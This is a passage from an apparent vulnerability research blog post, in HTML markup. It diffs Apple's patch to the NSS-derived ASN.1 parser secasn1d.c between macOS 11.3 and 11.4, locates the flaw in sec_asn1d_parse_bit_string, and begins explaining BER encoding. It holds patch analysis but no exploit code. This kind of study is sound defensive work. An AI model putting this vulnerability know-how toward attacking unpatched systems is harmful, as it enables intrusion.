href="https://opensource.apple.com/source/Security/Security-59754.120.12/"&gt;opensource.apple.com in the Security package&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span&gt;Here&amp;#39;s the diff between the MacOS 11.4 and 11.3 versions of &lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://opensource.apple.com/source/Security/Security-59754.120.12/OSX/libsecurity_asn1/lib/secasn1d.c.auto.html"&gt;secasn1d.c&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;which contains the ASN.1 parser:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.7d4e5129f2e85e500fa9ac546c708b609028d0e3"&gt;&lt;/a&gt;&lt;a id="t.0"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;diff &lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;&lt;span class="c3"&gt;git a&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c3"&gt;OSX&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c3"&gt;libsecurity_asn1&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c3"&gt;lib&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c3"&gt;secasn1d&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;c b&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c3"&gt;OSX&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c3"&gt;libsecurity_asn1&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c3"&gt;lib&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c3"&gt;secasn1d&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c2"&gt;c&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;index f338527&lt;/span&gt;&lt;span class="c1"&gt;..&lt;/span&gt;&lt;span class="c11"&gt;5b4915a&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;100644&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;---&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;a&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c3"&gt;OSX&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c3"&gt;libsecurity_asn1&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c3"&gt;lib&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c3"&gt;secasn1d&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c2"&gt;c&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;+++&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;b&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c3"&gt;OSX&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c3"&gt;libsecurity_asn1&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c3"&gt;lib&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c3"&gt;secasn1d&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c2"&gt;c&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;@@&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c11"&gt;434&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c11"&gt;9&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c11"&gt;434&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c11"&gt;6&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;@@&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;loser&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;PORT_ArenaRelease&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;cx&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;our_pool&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;our_mark&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;our_mark &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c12"&gt;-&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16 c12"&gt;if&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c12"&gt;(&lt;/span&gt;&lt;span class="c3 c12"&gt;new_state &lt;/span&gt;&lt;span class="c1 c12"&gt;!=&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1 c12"&gt;)&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c12"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c12"&gt;-&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; PORT_Free&lt;/span&gt;&lt;span class="c1 c12"&gt;(&lt;/span&gt;&lt;span class="c3 c12"&gt;new_state&lt;/span&gt;&lt;span class="c1 c12"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c12"&gt;-&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1 c12"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;@@&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c11"&gt;1794&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c11"&gt;19&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c11"&gt;1791&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c11"&gt;13&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;@@&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;sec_asn1d_parse_bit_string &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;sec_asn1d_state &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;/*PORT_Assert (state-&amp;gt;pending &amp;gt; 0); */&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;PORT_Assert &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;place &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;beforeBitString&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c12"&gt;-&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16 c12"&gt;if&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c12"&gt;((&lt;/span&gt;&lt;span class="c3 c12"&gt;state&lt;/span&gt;&lt;span class="c1 c12"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c12"&gt;pending &lt;/span&gt;&lt;span class="c1 c12"&gt;==&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11 c12"&gt;0&lt;/span&gt;&lt;span class="c1 c12"&gt;)&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c12"&gt;||&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c12"&gt;(&lt;/span&gt;&lt;span class="c3 c12"&gt;state&lt;/span&gt;&lt;span class="c1 c12"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c12"&gt;contents_length &lt;/span&gt;&lt;span class="c1 c12"&gt;==&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11 c12"&gt;1&lt;/span&gt;&lt;span class="c1 c12"&gt;))&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c12"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c4"&gt;+&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16 c4"&gt;if&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c4"&gt;(&lt;/span&gt;&lt;span class="c3 c4"&gt;state&lt;/span&gt;&lt;span class="c1 c4"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c4"&gt;pending &lt;/span&gt;&lt;span class="c1 c4"&gt;==&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11 c4"&gt;0&lt;/span&gt;&lt;span class="c1 c4"&gt;)&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c4"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;dest &lt;/span&gt;&lt;span class="c1"&gt;!=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c20"&gt;SecAsn1Item&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;item &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c20"&gt;SecAsn1Item&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*)(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;dest&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; item&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c20"&gt;Data&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; item&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c20"&gt;Length&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;place &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;beforeEndOfContents&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c12"&gt;-&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1 c12"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c12"&gt;-&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c16 c12"&gt;if&lt;/span&gt;&lt;span class="c1 c12"&gt;(&lt;/span&gt;&lt;span class="c3 c12"&gt;state&lt;/span&gt;&lt;span class="c1 c12"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c12"&gt;contents_length &lt;/span&gt;&lt;span class="c1 c12"&gt;==&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11 c12"&gt;1&lt;/span&gt;&lt;span class="c1 c12"&gt;)&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c12"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c12"&gt;-&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c23 c12"&gt;/* skip over (unused) remainder byte */&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c12"&gt;-&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c16 c12"&gt;return&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11 c12"&gt;1&lt;/span&gt;&lt;span class="c1 c12"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c12"&gt;-&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1 c12"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c12"&gt;-&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c16 c12"&gt;else&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c12"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c12"&gt;-&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c16 c12"&gt;return&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11 c12"&gt;0&lt;/span&gt;&lt;span class="c1 c12"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c4"&gt;+&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16 c4"&gt;return&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11 c4"&gt;0&lt;/span&gt;&lt;span class="c1 c4"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span&gt;The first change (removing the &lt;/span&gt;&lt;span class="c7"&gt;PORT_Free&lt;/span&gt;&lt;span class="c9"&gt;) is immaterial for Apple&amp;#39;s use case as it&amp;#39;s fixing a double free which doesn&amp;#39;t impact Apple&amp;#39;s build. It&amp;#39;s only relevant when &amp;quot;allocator marks&amp;quot; are enabled and this feature is disabled.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span&gt;The vulnerability must therefore be in &lt;/span&gt;&lt;span class="c7"&gt;sec_asn1d_parse_bit_string&lt;/span&gt;&lt;span class="c9"&gt;. We know from xerub&amp;#39;s tweet that something goes wrong with a state machine, but to figure it out we need to cover some ASN.1 basics and then start looking at how the NSS ASN.1 state machine works.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c32 c8" id="h.niqtzuiy3s6j"&gt;&lt;span class="c31 c28"&gt;ASN.1 encoding&lt;/span&gt;&lt;/h2&gt; &lt;p class="c6 c8"&gt;&lt;span&gt;ASN.1 is a Type-Length-Value serialization format, but with the neat quirk that it can also handle the case when you don&amp;#39;t know the length of the value, but want to serialize it anyway! That quirk is only possible when ASN.1 is encoded according to &lt;/span&gt;&lt;span&gt;Basic Encoding Rules (BER.) There is a stricter encoding called DER (Distinguished Encoding Rules)&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;which enforces that a particular value only has a single correct encoding and disallows the cases where you can serialize values without knowing their eventual lengths.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://luca.ntop.org/Teaching/Appunti/asn1.html"&gt;This page is a nice beginner&amp;#39;s guide to ASN.1&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;. I&amp;#39;d really recommend skimming that to get a good overview of ASN.1.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c9"&gt;There are a lot of built-in types in ASN.1. I&amp;#39;m only going to describe the minimum required to understand this vulnerability (mostly because I don&amp;#39;t know any more than that!) So let&amp;#39;s just start from the very first byte of a serialized ASN.1 object and figure out how to decode it:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span&gt;This first byte tells you the type, with the least significant 5 bits defining the type identifier. The special type identifier value of &lt;/span&gt;&lt;span class="c7"&gt;0x1f&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;tells you that the type identifier doesn&amp;#39;t fit in those 5 bits and is instead encoded in a different way (which we&amp;#39;ll ignore):&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c9"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgJvKMxjksjyIsG6m0LKukaFNjF_NRfiFDS4-rC8jg9smNCsH9emMFDKFncfg18NZxl0HWhsxa-FED-djCqDY7OdDF8-LRDdsGgz8S80Dx4r35EaIG_nYI_I78lbgnY_eQjayHZYpt1jA-O3MaCyOnHAfSjRNAz1L3pCwkSlvpNe9qrHrYwGUHWZaknCA/s600/image6%20%281%29.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgJvKMxjksjyIsG6m0LKukaFNjF_NRfiFDS4-rC8jg9smNCsH9emMFDKFncfg18NZxl0HWhsxa-FED-djCqDY7OdDF8-LRDdsGgz8S80Dx4r35EaIG_nYI_I78lbgnY_eQjayHZYpt1jA-O3MaCyOnHAfSjRNAz1L3pCwkSlvpNe9qrHrYwGUHWZaknCA/s600/image6%20%281%29.png" border="0" alt="Diagram showing first two bytes of a serialized ASN.1 object. The first byte in this case is the type and class identifier and the second is the length." style="max-height: 750; max-width: 600;"title="Diagram showing first two bytes of a serialized ASN.1 object. The first byte in this case is the type and class identifier and the second is the length." /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c34 c8"&gt;&lt;span class="c27 c26"&gt;Diagram showing first two bytes of a serialized ASN.1 object. The first byte in this case is the type and class identifier and the second is the length.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c9"&gt;The upper two bits of the first byte tell you the class of the type: universal, application, content-specific or private. For us, we&amp;#39;ll leave that as 0 (universal.)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span&gt;Bit 6 is where the fun starts. A value of 1 tells us that this is a &lt;/span&gt;&lt;span class="c17"&gt;primitive&lt;/span&gt;&lt;span&gt;&amp;nbsp;encoding which means that following the length are content bytes which can be directly interpreted as the intended type. For example, a primitive encoding of the string &amp;quot;HELLO&amp;quot; as an ASN.1 &lt;/span&gt;&lt;span class="c7"&gt;printable string&lt;/span&gt;&lt;span&gt;&amp;nbsp;would have a length byte of &lt;/span&gt;&lt;span class="c7"&gt;5&lt;/span&gt;&lt;span&gt;&amp;nbsp;followed by the ASCII characters &amp;quot;&lt;/span&gt;&lt;span class="c7"&gt;HELLO&lt;/span&gt;&lt;span class="c9"&gt;&amp;quot;. All fairly straightforward.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span&gt;A value of 0 for bit 6 however tells us that this is a &lt;/span&gt;&lt;span class="c17"&gt;constructed&lt;/span&gt;&lt;span&gt;&amp;nbsp;encoding. This means that the bytes following the length are not the &amp;quot;raw&amp;quot; content bytes for the type but are instead ASN.1 encodings of one or more &amp;quot;chunks&amp;quot; which need to be individually parsed and concatenated to form the final output value. And to make things extra complicated it&amp;#39;s also possible to specify a length value of &lt;/span&gt;&lt;span class="c7"&gt;0&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;which means that you don&amp;#39;t even know how long the reconstructed output will be or how much of the subsequent input will be required to completely build the output.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span&gt;This final case (of a constructed type with indefinite length) is known as &lt;/span&gt;&lt;span class="c17"&gt;indefinite&lt;/span&gt;&lt;span&gt;&amp;nbsp;form. The end of the input which makes up a single indefinite value is signaled by a serialized type with the identifier, constructed, class and length values all equal to &lt;/span&gt;&lt;span class="c7"&gt;0&lt;/span&gt;&lt;span&gt;&amp;nbsp;, which is encoded as two &lt;/span&gt;&lt;span class="c7"&gt;NULL&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;bytes.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c32 c8" id="h.iu15q8vvc4lc"&gt;&lt;span class="c31 c28"&gt;ASN.1 bitstrings&lt;/span&gt;&lt;/h2&gt; &lt;p class="c6 c8"&gt;&lt;span&gt;Most of the ASN.1 string types require no special treatment; they&amp;#39;re just buffers of raw bytes. Some of them have length restrictions. For example: a &lt;/span&gt;&lt;span class="c7"&gt;BMP&lt;/span&gt;&lt;span&gt;&amp;nbsp;string must have an even length and a &lt;/span&gt;&lt;span 